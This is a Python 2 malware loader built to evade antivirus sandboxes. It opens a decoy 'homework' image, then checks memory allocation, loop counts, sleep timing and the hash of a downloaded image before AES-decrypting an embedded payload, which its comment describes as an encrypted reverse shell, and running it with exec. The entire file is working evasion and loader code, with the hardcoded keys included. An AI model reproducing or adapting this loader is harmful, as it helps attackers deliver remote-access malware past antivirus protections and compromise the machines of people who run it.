import binascii
import pyaes
import sys
import time
import requests
import hashlib
import subprocess
import cry_lizzie  #stored the encrypted reverse shell here

'''
Note: the variable names used here are randomly generated names(except for flag where their real purpose is mentioned in block letters)
this script uses several techniques to evade dynamic analysis done by AVs and it is only when we are sure that we are not in a AV's sandbox
or virtual enviornment, we decrypt our malicious code and the execute it
'''
#flags for each method for bypassing dynamic analysis
mi_FLAG_ckkya_ALLOC = False
te_FLAG_wDee_SUM    = False
pu_FLAG_katch_TIME  = False
it_FLAG_11_HASH     = False

MAX_ilViria_LEN     = 100000000    #size of memory to be allocated
mi_SUM_ckkya        = 0            #sum of the incremented values
oM_SLEEP_hdM_TIME   = 120          #sleep timer

#hash of the file to be downloaded and compared with
ni_ORIGINAL_Bk_HASH = 'a8d13769d70b31de975f2ffb8e20dabf'
#link for the file to be downloaded at runtime (it's a http link not https because requests was hindering while freezing the script
pa_URL_nsies        = "http://rbzs.myspecies.info/sites/rbzs.myspecies.info/files/styles/slideshow_large/public/IMG_3640-1.jpg?itok=UfY5gw0u"

# open the dummy img
with open("homework_img.jpeg","wb") as new_img_file:
    your_name    = "l4Re6L81Rz5zKBAI"
    glade        = pyaes.AESModeOfOperationCTR(your_name)
    nIVav        = cry_lizzie.lizzie_img.decode('hex')
    decrypt_data = glade.decrypt(nIVav )
    new_img_file.write(decrypt_data)
try:
    #random code
    buped = ["my","homework","is","complete","now"]
    for i in range(len(buped)):
        print buped[i] 
    subprocess.Popen('homework_img.jpeg', shell = True)
except:
    print "i am failing "
    for i in range(len(buped)):
        buped[i]*=i
        print buped[i]
    
# allocate huge chunk of memory
valli = [0]*MAX_ilViria_LEN
if len(valli) == MAX_ilViria_LEN:
    mi_FLAG_ckkya_ALLOC = True  #if allocation happends, then set the alloc flag to true

# increment through huge iterations    
for i in valli:
   mi_SUM_ckkya += 1   
if mi_SUM_ckkya == MAX_ilViria_LEN:
    te_FLAG_wDee_SUM = True     #if all the iteration happens,then set the iter flag to true

# check if the sleep timer is executed or not
point_one = round(time.time())
time.sleep(oM_SLEEP_hdM_TIME)
point_two = round(time.time())
if (point_one+oM_SLEEP_hdM_TIME) == point_two:
    pu_FLAG_katch_TIME = True   #if sleep is executed,then set time flag to true

# download a file and compare it's hash with already computed hash of the same file    
r = requests.get(pa_URL_nsies)
with open("mo_buffer_has.jpeg",'wb') as kyledvm:
    kyledvm.write(r.content)
ni_CURRENT_Bk_HASH = hashlib.md5(open('mo_buffer_has.jpeg','rb').read()).hexdigest()
if ni_CURRENT_Bk_HASH == ni_ORIGINAL_Bk_HASH:
    it_FLAG_11_HASH = True      #if hashes are the same then set the hash flag to true

#compare all the flags and if all the flags are true then decrypt and execute your malicious code
if mi_FLAG_ckkya_ALLOC and te_FLAG_wDee_SUM and pu_FLAG_katch_TIME and it_FLAG_11_HASH:
    my_name      = "7I{#|Q]f[n|e)hOx" #key for decryption, you can use your own random key 
    pacatup      = pyaes.AESModeOfOperationCTR(my_name)
    crypfwCto_data  = cry_lizzie.lizzie.decode('hex')
    decrypt_data = pacatup.decrypt(crypfwCto_data)
    exec(decrypt_data)
    
